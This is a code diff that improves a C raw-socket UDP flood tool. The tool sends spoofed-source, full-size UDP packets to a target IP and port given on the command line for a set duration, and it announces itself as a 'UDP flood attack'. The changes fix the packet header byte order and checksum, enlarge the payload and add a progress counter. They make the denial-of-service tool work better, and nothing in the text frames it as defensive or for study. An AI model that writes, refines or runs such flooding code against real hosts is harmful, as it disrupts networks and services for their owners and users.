@@ -6,6 +6,10 @@
 #include <sys/socket.h>
 #include <netinet/ip.h>
 #include <netinet/udp.h>
+#include <linux/if_packet.h>
+#include <net/ethernet.h>
+#include <net/if.h>
+#include <sys/ioctl.h>
 #include <time.h>
 
 unsigned short checksum(void *b, int len)
@@ -28,18 +32,25 @@ void flood(char *target_ip, int target_port, int duration)
 {
     int sock;
     struct sockaddr_in target;
-    char packet[1024];
+    char packet[4096];
     struct iphdr *ip = (struct iphdr *)packet;
     struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
     char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
     int packet_size;
     time_t start_time;
     int count = 0;
+    int optval = 1;
 
     sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sock < 0)
     {
-        printf("Failed to create socket\n");
+        perror("socket");
+        exit(1);
+    }
+
+    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) < 0)
+    {
+        perror("setsockopt");
         exit(1);
     }
 
@@ -47,54 +58,54 @@ void flood(char *target_ip, int target_port, int duration)
     target.sin_port = htons(target_port);
     target.sin_addr.s_addr = inet_addr(target_ip);
 
-    int one = 1;
-    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
-    {
-        printf("Failed to set socket option\n");
-        exit(1);
-    }
-
-    memset(packet, 0, sizeof(packet));
-
     srand(time(NULL));
 
     start_time = time(NULL);
 
     while (time(NULL) - start_time < duration)
     {
+        memset(packet, 0, sizeof(packet));
+
         ip->ihl = 5;
         ip->version = 4;
         ip->tos = 0;
-        ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 64;
-        ip->id = rand() % 65535;
+        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + 1472);
+        ip->id = htons(rand() % 65535);
         ip->frag_off = 0;
-        ip->ttl = 255;
+        ip->ttl = 64;
         ip->protocol = IPPROTO_UDP;
         ip->check = 0;
-        ip->saddr = inet_addr("192.168.1.1");
+        ip->saddr = inet_addr("10.0.0.1");
         ip->daddr = target.sin_addr.s_addr;
 
         udp->source = htons(rand() % 65535);
         udp->dest = htons(target_port);
-        udp->len = htons(sizeof(struct udphdr) + 64);
+        udp->len = htons(sizeof(struct udphdr) + 1472);
+        udp->check = 0;
 
-        memset(data, 'A', 64);
+        memset(data, 'X', 1472);
 
-        ip->check = checksum((unsigned short *)packet, ip->tot_len);
+        ip->check = checksum((unsigned short *)ip, sizeof(struct iphdr));
 
-        packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + 64;
+        packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + 1472;
 
         if (sendto(sock, packet, packet_size, 0, (struct sockaddr *)&target, sizeof(target)) < 0)
         {
-            printf("Failed to send packet\n");
+            perror("sendto");
         }
         else
         {
             count++;
         }
+
+        if (count % 10000 == 0)
+        {
+            printf("Sent: %d packets\r", count);
+            fflush(stdout);
+        }
     }
 
-    printf("Sent %d packets to %s:%d\n", count, target_ip, target_port);
+    printf("\nSent %d packets to %s:%d\n", count, target_ip, target_port);
     close(sock);
 }
 
@@ -106,13 +117,12 @@ int main(int argc, char *argv[])
         return 1;
     }
 
-    char *target_ip = argv[1];
-    int target_port = atoi(argv[2]);
-    int duration = atoi(argv[3]);
+    printf("Starting UDP flood attack\n");
+    printf("Target: %s:%d\n", argv[1], atoi(argv[2]));
+    printf("Duration: %s seconds\n", argv[3]);
+    printf("Press Ctrl+C to stop\n\n");
 
-    printf("Starting attack on %s:%d for %d seconds\n", target_ip, target_port, duration);
-
-    flood(target_ip, target_port, duration);
+    flood(argv[1], atoi(argv[2]), atoi(argv[3]));
 
     return 0;
 }
